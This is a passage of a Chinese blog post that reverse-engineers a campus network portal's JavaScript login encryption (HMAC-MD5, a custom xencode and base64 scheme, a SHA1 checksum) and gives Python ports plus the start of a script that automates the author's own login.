alt="2"></p><p>可以发现这里主要是进行登录类型判断，进行选择，那就接着追踪。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/3.png" alt="3"></p><p>可以发现是用一个_loginAccount函数去登录的，而这个函数就在下面，我们看看它的逻辑。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/8.png" alt="3"></p><p>这里主要有一个getToken函数,然后密码用password和token进行了md5加盐的hash加密，因此password字段就很容易得出来了，那么我们接着看看token怎么获取的，之前我们通过手动请求猜测challenge字段是可能是token，这次我们跟踪_getToken函数看看。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/9.png" alt="3"></p><p>发现这里返回了res.challenge，那么就可以大胆推定刚刚的challenge就是token了。那么登录的流程应该就是，先去请求一个token，然后用token进行加密登录。这里先给出md5加密的脚本，这里参考了别的师傅的博客的做法，在这里—-&gt;<a href="https://blog.csdn.net/qq_41797946/article/details/89417722">传送门</a>，我也一直没理解它盐是怎么加的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_md5.py</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span>(<span class="params">password,token</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hmac.new(token.encode(), password.encode(), hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure><h3 id="chksum和info加密"><a href="#chksum和info加密" class="headerlink" title="chksum和info加密"></a>chksum和info加密</h3><p>翻到后面可以直接看到url的请求参数。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/10.png" alt="3"></p><p>url可以直接抓包获得，这个没必要去分析它的url是啥，主要看我们之前需要知道的三个字段，这里第二点不太明白了，虽然看到它的挡路方式好像是OTP，但是抓包获得的一直是{md5}，也不太懂为啥，但是我们姑且选择后者，毕竟实践才是检验真理的唯一标准嘛。</p><p>这里password的hmd5我们前面已经可以算了，接下来这个info的参数是i，chksum的参数是sha1(str)，对str进行了sha1加密。那么我们往上看看这个i和这个str是怎么获得的。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/11.png" alt="3"></p><p>这里可以看到str只是对一些参数进行了相加，最后sha1散列。</p><p>那么如此一来我们只需要得到i就可以把整个url的参数构造完成了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/12.png" alt="3"></p><p>可以看到是调用了_encodeUserInfo函数去加密得到i的，那么我们进一步搜索这个函数的加密方式。</p><p>这里我直接贴出来这个加密的函数了。</p><h3 id="加密实现脚本"><a href="#加密实现脚本" class="headerlink" title="加密实现脚本"></a>加密实现脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">_encodeUserInfo.set(_assertThisInitialized(_this), &#123;</span><br><span class="line">      <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">value</span>: <span class="function"><span class="keyword">function</span> <span class="title">value</span>(<span class="params">info, token</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 克隆自 $.base64，防止污染</span></span><br><span class="line">        <span class="keyword">var</span> base64 = _this.clone($.base64); <span class="comment">// base64 设置 Alpha</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        base64.setAlpha(<span class="string">&#x27;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&#x27;</span>); <span class="comment">// 用户信息转 JSON</span></span><br><span class="line"></span><br><span class="line">        info = <span class="built_in">JSON</span>.stringify(info);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">str, key</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (str === <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">var</span> v = s(str, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">var</span> k = s(key, <span class="literal">false</span>);</span><br><span class="line">          <span class="keyword">if</span> (k.length &lt; <span class="number">4</span>) k.length = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">var</span> n = v.length - <span class="number">1</span>,</span><br><span class="line">              z = v[n],</span><br><span class="line">              y = v[<span class="number">0</span>],</span><br><span class="line">              c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span>,</span><br><span class="line">              m,</span><br><span class="line">              e,</span><br><span class="line">              p,</span><br><span class="line">              q = <span class="built_in">Math</span>.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>)),</span><br><span class="line">              d = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> (<span class="number">0</span> &lt; q--) &#123;</span><br><span class="line">            d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>);</span><br><span class="line">            e = d &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n; p++) &#123;</span><br><span class="line">              y = v[p + <span class="number">1</span>];</span><br><span class="line">              m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">              m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">              m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">              z = v[p] = v[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">            m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">            m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">            z = v[n] = v[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> l(v, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> c = a.length;</span><br><span class="line">          <span class="keyword">var</span> v = [];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; c; i += <span class="number">4</span>) &#123;</span><br><span class="line">            v[i &gt;&gt; <span class="number">2</span>] = a.charCodeAt(i) | a.charCodeAt(i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | a.charCodeAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span> | a.charCodeAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) v[v.length] = c;</span><br><span class="line">          <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> d = a.length;</span><br><span class="line">          <span class="keyword">var</span> c = d - <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) &#123;</span><br><span class="line">            <span class="keyword">var</span> m = a[d - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (m &lt; c - <span class="number">3</span> || m &gt; c) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            c = m;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; d; i++) &#123;</span><br><span class="line">            a[i] = <span class="built_in">String</span>.fromCharCode(a[i] &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> b ? a.join(<span class="string">&#x27;&#x27;</span>).substring(<span class="number">0</span>, c) : a.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;SRBX1&#125;&#x27;</span> + base64.encode(encode(info, token));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这里也得感谢这位大佬将这个js转成了python脚本，我就直接贴结果了,里面还有一个很明显的base64，这里我也不自己写了，直接贴吧哈哈哈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_xencode.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force</span>(<span class="params">msg</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> msg:</span><br><span class="line">        ret.append(<span class="built_in">ord</span>(w))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ordat</span>(<span class="params">msg, idx</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; idx:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(msg[idx])</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    pwd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        pwd.append(</span><br><span class="line">            ordat(msg, i) | ordat(msg, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | ordat(msg, i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">            | ordat(msg, i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        pwd.append(l)</span><br><span class="line">    <span class="keyword">return</span> pwd</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    ll = (l - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        m = msg[l - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> m &lt; ll - <span class="number">3</span> <span class="keyword">or</span> m &gt; ll:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        ll = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l):</span><br><span class="line">        msg[i] = <span class="built_in">chr</span>(msg[i] &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(</span><br><span class="line">            msg[i] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)[<span class="number">0</span>:ll]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    pwd = sencode(msg, <span class="literal">True</span>)</span><br><span class="line">    pwdk = sencode(key, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwdk) &lt; <span class="number">4</span>:</span><br><span class="line">        pwdk = pwdk + [<span class="number">0</span>] * (<span class="number">4</span> - <span class="built_in">len</span>(pwdk))</span><br><span class="line">    n = <span class="built_in">len</span>(pwd) - <span class="number">1</span></span><br><span class="line">    z = pwd[n]</span><br><span class="line">    y = pwd[<span class="number">0</span>]</span><br><span class="line">    c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span></span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    q = math.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>))</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; q:</span><br><span class="line">        d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>)</span><br><span class="line">        e = d &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p &lt; n:</span><br><span class="line">            y = pwd[p + <span class="number">1</span>]</span><br><span class="line">            m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">            m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">            m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">            pwd[p] = pwd[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>)</span><br><span class="line">            z = pwd[p]</span><br><span class="line">            p = p + <span class="number">1</span></span><br><span class="line">        y = pwd[<span class="number">0</span>]</span><br><span class="line">        m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">        m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">        m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">        pwd[n] = pwd[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>)</span><br><span class="line">        z = pwd[n]</span><br><span class="line">        q = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lencode(pwd, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_base64.py</span></span><br><span class="line">_PADCHAR = <span class="string">&quot;=&quot;</span></span><br><span class="line">_ALPHA = <span class="string">&quot;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_getbyte</span>(<span class="params">s, i</span>):</span></span><br><span class="line">    <span class="comment">#print(s,&#x27; &#x27;,i)</span></span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]);</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">255</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;INVALID_CHARACTER_ERR: DOM Exception 5&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">s</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    b10=<span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    imax = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s) % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,imax,<span class="number">3</span>):</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>) | _getbyte(s, i + <span class="number">2</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[(b10 &amp; <span class="number">63</span>)])</span><br><span class="line">    i=imax</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) - imax ==<span class="number">1</span>:</span><br><span class="line">        b10 = _getbyte(s, i) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _PADCHAR + _PADCHAR);</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(s) - imax == <span class="number">2</span>:</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)] + _PADCHAR);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(x)</span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_sha1.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sha1</span>(<span class="params">value</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(value.encode()).hexdigest()</span><br></pre></td></tr></table></figure><p>逻辑这么分析到位了之后接下来就开始写两次抓包的脚本吧，这里也直接给了，毕竟逻辑就真的这么点，主要的工作量都在js转python上面，而已经有人转好了我就直接拿过来用了，这里再次鸣谢huxiaofan1223大佬，本篇博客也贴在上面的传送门当中了。</p><h2 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> encryption.srun_md5 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_sha1 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_xencode <span class="keyword">import</span> *</span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">init_url=<span class="string">&quot;http://10.110.74.91&quot;</span></span><br><span class="line">get_challenge_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/get_challenge&quot;</span></span><br><span class="line"></span><br><span class="line">srun_portal_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/srun_portal&quot;</span></span><br><span class="line">n = <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">type</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">ac_id=<span class="string">&#x27;4&#x27;</span></span><br><span class="line">enc = <span class="string">&quot;srun_bx1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chksum</span>():</span></span><br><span class="line">    chkstr = token+username</span><br><span class="line">    chkstr += token+hmd5</span><br><span class="line">    chkstr += token+ac_id</span><br><span class="line">    chkstr += token+ip</span><br><span class="line">    chkstr += token+n</span><br><span class="line">    chkstr += token+<span class="built_in">type</span></span><br><span class="line">    chkstr += token+i</span><br><span class="line">    <span class="keyword">return</span> chkstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span>():</span></span><br><span class="line">    info_temp=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line">        <span class="string">&quot;acid&quot;</span>:ac_id,</span><br><span class="line">        <span class="string">&quot;enc_ver&quot;</span>:enc</span><br><span class="line">    &#125;</span><br><span class="line">    i=re.sub(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="built_in">str</span>(info_temp))</span><br><span class="line">    i=re.sub(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>,i)</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_getip</span>():</span></span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    init_res=requests.get(init_url,headers=header)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;初始化获取ip&quot;</span>)</span><br><span class="line">    <span class="comment">#print(init_res.text)</span></span><br><span class="line">    ip=re.search(<span class="string">&#x27;ip     : &quot;(.*?)&quot;&#x27;</span>,init_res.text).group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span 